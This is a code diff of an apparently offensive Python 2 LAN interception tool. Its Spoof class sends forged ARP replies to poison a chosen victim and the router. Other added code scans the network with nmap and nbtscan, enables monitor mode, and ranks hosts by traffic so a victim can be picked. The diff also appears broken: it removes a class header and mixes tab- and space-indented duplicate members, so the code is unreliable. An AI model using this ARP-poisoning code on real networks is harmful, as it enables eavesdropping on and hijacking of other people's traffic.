@@ -19,6 +19,7 @@ __contact__ = 'danhmcinerney with gmail'
 __version__ = 1.0
 
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
@@ -81,19 +82,19 @@ logger = open('LANspy.log.txt', 'w+')
 DN = open(devnull, 'w')
 
 class Spoof():
-   def originalMAC(self, ip):
-      # srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
-      ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
-      for s,r in ans:
-         return r.sprintf("%Ether.src%")
-   def poison(self, routerIP, victimIP, routerMAC, victimMAC):
-      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
-   def restore(self, routerIP, victimIP, routerMAC, victimMAC):
-      send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
-      send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
+    def originalMAC(self, ip):
+        # srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
+        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
+        for s, r in ans:
+            return r.sprintf("%Ether.src%")
 
-class Parser():
+    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
+        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+
+    def restore(self, routerIP, victimIP, routerMAC, victimMAC):
+        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
 
 	# Mail, irc, post parsing
 	OheadersFound = []
@@ -712,6 +713,103 @@ class Queued(object):
 		return 'queued'
 
 class active_users():
+    IPandMAC = []
+    start_time = time.time()
+    current_time = 0
+    monmode = ''
+
+    def pkt_cb(self, pkt):
+        if pkt.haslayer(Dot11):
+            pkt = pkt[Dot11]
+            if pkt.type == 2:
+                addresses = [pkt.addr1.upper(), pkt.addr2.upper(), pkt.addr3.upper()]
+                for x in addresses:
+                    for y in self.IPandMAC:
+                        if x in y[1]:
+                            y[2] = y[2] + 1
+                self.current_time = time.time()
+            if self.current_time > self.start_time + 1:
+                self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True)  # sort by data packets
+                os.system('/usr/bin/clear')
+                print '[*] ' + T + 'IP address' + W + ' and ' + R + 'data packets' + W + ' sent/received'
+                print '---------------------------------------------'
+                for x in self.IPandMAC:
+                    if len(x) == 3:
+                        ip = x[0].ljust(16)
+                        data = str(x[2]).ljust(5)
+                        print T + ip + W, R + data + W
+                    else:
+                        ip = x[0].ljust(16)
+                        data = str(x[2]).ljust(5)
+                        print T + ip + W, R + data + W, x[3]
+                print '\n[*] Hit Ctrl-C at any time to stop and choose a victim IP'
+                self.start_time = time.time()
+
+    def users(self, IPprefix, routerIP):
+
+        print '[*] Running ARP scan to identify users on the network; this may take a minute - [nmap -sn -n %s]' % IPprefix
+        iplist = []
+        maclist = []
+        try:
+            nmap = Popen(['nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
+            nmap = nmap.communicate()[0]
+            nmap = nmap.splitlines()[2:-1]
+        except Exception:
+            print '[-] Nmap ARP ping failed, is nmap installed?'
+        for x in nmap:
+            if 'Nmap' in x:
+                pieces = x.split()
+                nmapip = pieces[len(pieces) - 1]
+                nmapip = nmapip.replace('(', '').replace(')', '')
+                iplist.append(nmapip)
+            if 'MAC' in x:
+                nmapmac = x.split()[2]
+                maclist.append(nmapmac)
+        zipped = zip(iplist, maclist)
+        self.IPandMAC = [list(item) for item in zipped]
+
+        # Make sure router is caught in the arp ping
+        r = 0
+        for i in self.IPandMAC:
+            i.append(0)
+            if r == 0:
+                if routerIP == i[0]:
+                    i.append('router')
+                    routerMAC = i[1]
+                    r = 1
+        if r == 0:
+            exit('[-] Router MAC not found. Exiting.')
+
+        # Do nbtscan for windows netbios names
+        print '[*] Running nbtscan to get Windows netbios names - [nbtscan %s]' % IPprefix
+        try:
+            nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
+            nbt = nbt.communicate()[0]
+            nbt = nbt.splitlines()
+            nbt = nbt[4:]
+        except Exception:
+            print '[-] nbtscan error, are you sure it is installed?'
+        for l in nbt:
+            try:
+                l = l.split()
+                nbtip = l[0]
+                nbtname = l[1]
+            except Exception:
+                print '[-] Could not find any netbios names. Continuing without them'
+            if nbtip and nbtname:
+                for a in self.IPandMAC:
+                    if nbtip == a[0]:
+                        a.append(nbtname)
+
+        # Start monitor mode
+        print '[*] Enabling monitor mode [airmon-ng ' + 'start ' + interface + ']'
+        try:
+            promiscSearch = Popen(['airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
+            promisc = promiscSearch.communicate()[0]
+            monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
+            self.monmode = monmodeSearch.group(1)
+        except Exception:
+            exit('[-] Enabling monitor mode failed, do you have aircrack-ng installed?')
 
 	IPandMAC = []
 	start_time = time.time()
@@ -816,14 +914,15 @@ class active_users():
 
 #Print all the variables
 def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
-   print "[*] Active interface: " + interface
-   print "[*] DHCP server: " + DHCPsrvr
-   print "[*] DNS server: " + dnsIP
-   print "[*] Local domain: " + local_domain
-   print "[*] Router IP: " + routerIP
-   print "[*] Victim IP: " + victimIP
-   logger.write("[*] Router IP: " + routerIP+'\n')
-   logger.write("[*] victim IP: " + victimIP+'\n')
+    print "[*] Active interface: " + interface
+    print "[*] DHCP server: " + DHCPsrvr
+    print "[*] DNS server: " + dnsIP
+    print "[*] Local domain: " + local_domain
+    print "[*] Router IP: " + routerIP
+    print "[*] Victim IP: " + victimIP
+    logger.write("[*] Router IP: " + routerIP + '\n')
+    logger.write("[*] victim IP: " + victimIP + '\n')
+
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(victimMAC):
